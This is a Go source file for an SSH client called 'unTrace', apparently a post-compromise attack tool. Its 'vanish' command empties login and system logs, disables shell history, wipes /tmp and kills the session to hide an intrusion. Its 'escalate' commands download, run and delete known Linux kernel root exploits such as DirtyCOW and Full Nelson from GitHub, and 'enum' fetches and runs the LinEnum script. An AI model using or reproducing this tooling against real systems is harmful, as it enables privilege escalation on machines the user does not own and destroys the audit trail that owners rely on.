package main;

import (
    "golang.org/x/crypto/ssh"
    "bufio"
    "fmt"
    "log"
    "os"
    "io"
    "bytes"
    "strings"
    "github.com/howeyc/gopass"
    "github.com/acarl005/stripansi"
    "os/exec"
)

var escapePrompt = []byte{'$', ' '}

var arch = "32"
var wget = "wget"

func main() {
    fmt.Print("IP Address of remote host: ")
    ip := readLine()
    fmt.Print("Port of remote host: ")
    port := readLine()

    fmt.Print("Login as: ")
    user := readLine()
    fmt.Print("Enter " + user + "'s password: ")
    passwordBytes, _ := gopass.GetPasswd()

    password := string(passwordBytes)

    fmt.Println("Connecting to " + ip + " on port " + port + "...")

    sshConfig := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{ssh.Password(password)},
	}
    sshConfig.HostKeyCallback = ssh.InsecureIgnoreHostKey()

    host := ip + ":" + port

    client, err := ssh.Dial("tcp", host, sshConfig)
	if err != nil {
        fmt.Println(err)
        os.Exit(3)
	}

    session, err := client.NewSession()

    if err != nil {
        log.Fatalf("unable to create session: %s", err)
    }

    session.Stdout = os.Stdout
	session.Stderr = os.Stderr
	in, _ := session.StdinPipe()

	// Set up terminal modes
	modes := ssh.TerminalModes{
		ssh.ECHO:          0,     // disable echoing
		ssh.TTY_OP_ISPEED: 14400, // input speed = 14.4kbaud
		ssh.TTY_OP_OSPEED: 14400, // output speed = 14.4kbaud
	}

    clear()

	// Request pseudo terminal
	if err := session.RequestPty("vt220", 80, 40, modes); err != nil {
		log.Fatalf("request for pseudo terminal failed: %s", err)
	}

	// Start remote shell
	if err := session.Shell(); err != nil {
		log.Fatalf("failed to start shell: %s", err)
	}
    
    old1 := os.Stdout // keep backup of the real stdout
    r1, w1, _ := os.Pipe()
    os.Stdout = w1

    fmt.Fprint(in, "uname -m")

    outC1 := make(chan string)
    // copy the output in a separate goroutine so printing can't block indefinitely
    go func() {
        var buf bytes.Buffer
        io.Copy(&buf, r1)
        outC1 <- buf.String()
    }()

    // back to normal state
    w1.Close()
    os.Stdout = old1 // restoring the real stdout
    out1 := <-outC1

    cleanMsg1 := stripansi.Strip(out1)
    cleanMsg1 = strings.Trim(cleanMsg1, "\n")
    cleanMsg1 = strings.TrimSpace(cleanMsg1)
    
    if (cleanMsg1 == "x86_64") {
        arch = "64"
        fmt.Println("Architecture is 64 bit")
    } else {
        fmt.Println("Architecture is 32 bit")
    }
    
    old2 := os.Stdout // keep backup of the real stdout
    r2, w2, _ := os.Pipe()
    os.Stdout = w2

    fmt.Fprint(in, `wget -v >/dev/null 2>&1 || { echo >&2 "NOWGET"; }`)

    outC2 := make(chan string)
    // copy the output in a separate goroutine so printing can't block indefinitely
    go func() {
        var buf bytes.Buffer
        io.Copy(&buf, r2)
        outC2 <- buf.String()
    }()

    // back to normal state
    w2.Close()
    os.Stdout = old2 // restoring the real stdout
    out2 := <-outC2

    cleanMsg2 := stripansi.Strip(out2)
    cleanMsg2 = strings.Trim(cleanMsg2, "\n")
    cleanMsg2 = strings.TrimSpace(cleanMsg2)
    
    if (cleanMsg2 == "NOWGET") {
        wget = "curl"
        fmt.Println("Using curl")
    } else {
        fmt.Println("Using wget")
    }
    
	// Accepting commands
	for {
        cmd := readLine()
        str := ""

        if (cmd == "clear") {
            clear()
            clear()
            clear()
            clear()
            clear()
        } else if (strings.HasPrefix(cmd, "unt")) {
            cmd = strings.TrimLeft(cmd, "unt ")
            str = handleUnt(cmd)
        } else {
            str = cmd;
        }

        str += "\r\n"

        old := os.Stdout // keep backup of the real stdout
        r, w, _ := os.Pipe()
        os.Stdout = w

		fmt.Fprint(in, str)

        outC := make(chan string)
        // copy the output in a separate goroutine so printing can't block indefinitely
        go func() {
            var buf bytes.Buffer
            io.Copy(&buf, r)
            outC <- buf.String()
        }()

        // back to normal state
        w.Close()
        os.Stdout = old // restoring the real stdout
        out := <-outC

        cleanMsg := stripansi.Strip(out)

        fmt.Print(cleanMsg)
        if (cmd == "exit") {
            break;
        }
    }

    session.Close()
    client.Close()

    bufio.NewReader(os.Stdin).ReadBytes('\n')
}

func clear() {
    cmd := exec.Command("cmd", "/c", "cls") //Windows example, its tested
    cmd.Stdout = os.Stdout
    cmd.Run()
}

func readLine() string {
    reader := bufio.NewReader(os.Stdin)
    text, _ := reader.ReadString('\n')
    text = strings.Trim(text, "\n")
    return strings.TrimSpace(text)
}

func echo(str string) string {
    temp := strings.Split(str, "\n")
    cmd := ""
    for _, element := range temp {
        cmd += "echo \"" + strings.Replace(element, "\"", "\\\"", -1) + "\";"
    }

    return cmd
}
func command(str string) string {
    temp := strings.Split(str, "\n")
    cmd := ""
    for _, element := range temp {
        cmd += element + ";"
    }

    return cmd
}

func getDownloadCommand(url string, target string) string {
    if (wget == "curl") {
        return "curl -o " + target + " " + url
    } else {
        return "wget -O " + target + " " + url
    }
}

var helpString = `unTrace by milan44

help       Shows a list of all commands.
vanish     Closes the ssh connection without leaving a trace.
escalate   Shows a list of priviledge escalation exploits. Usage 'unt escalate <exploit>'.`

func handleUnt(arg string) string {
    arg = strings.Trim(arg, "\n")
    arg = strings.TrimSpace(arg)

    switch(arg) {
        case "help":
            return echo(helpString);
        case "vanish":
            return command(`export HISTSIZE=0
cat /dev/null > /var/adm/lastlogin
cat /dev/null > /var/log/lastlogin
cat /dev/null > /var/adm/wtmpx
cat /dev/null > /var/adm/wtmp
cat /dev/null > /var/log/wtmp
cat /dev/null > /var/adm/messages
cat /dev/null > /var/log/messages
rm -rfi /tmp/*
rm -rfi /tmp/.*
cat /dev/null > ~/.sh_historycsh
cat /dev/null > ~/.historyksh
cat /dev/null > ~/.sh_historybash
cat /dev/null > ~/.bash_history
cat /dev/null > ~/.history
kill -9 $$`);
        case "escalate":
            return echo(`Available Priviledge escalation exploits:
pokemon       DirtyCOW AddUser (Ubuntu <4.4/<3.13; Debian <4.7.8)
mempodipper   Mempodipper (Linux 2.6.39<3.2.2 Gentoo/Debian)
overlayfs     overlayfs (Linux 3.13.0<3.19)
nelson        Full Nelson (Linux 2.6.31<2.6.37 RedHat/Debian)
clown         Clown NewUser (Linux 3.0<3.3.5)`);
        case "escalate pokemon":
            return command(`cd ~
` + getDownloadCommand(`https://github.com/evait-security/ClickNRoot/blob/master/1/exploit_` + arch + `?raw=true`, `exploit`) + `
chmod +x exploit
./exploit root
rm exploit
echo Try using su firefart using the password root.`)
        case "escalate mempodipper":
            return command(`cd ~
` + getDownloadCommand(`https://github.com/evait-security/ClickNRoot/blob/master/3/exploit_` + arch + `?raw=true`, `exploit`) + `
chmod +x exploit
./exploit
rm exploit`)
        case "escalate overlayfs":
            return command(`cd ~
` + getDownloadCommand(`https://github.com/evait-security/ClickNRoot/blob/master/8/exploit_` + arch + `?raw=true`, `exploit`) + `
chmod +x exploit
./exploit
rm exploit`)
        case "escalate nelson":
            return command(`cd ~
` + getDownloadCommand(`https://github.com/evait-security/ClickNRoot/blob/master/4/exploit_` + arch + `?raw=true`, `exploit`) + `
chmod +x exploit
./exploit
rm exploit`)
        case "escalate clown":
            return command(`cd ~
` + getDownloadCommand(`https://github.com/evait-security/ClickNRoot/blob/master/6/exploit_` + arch + `?raw=true`, `exploit`) + `
chmod +x exploit
./exploit
rm exploit`)
        case "enum":
            return command(`cd ~
` + getDownloadCommand(`https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`, `enum.sh`) + `
chmod +x enum.sh
./enum.sh -r report -e ~ -t
rm enum.sh`)
    }

    return echo("Command 'unt " + arg + "' not defined! Try 'unt help'.")
}
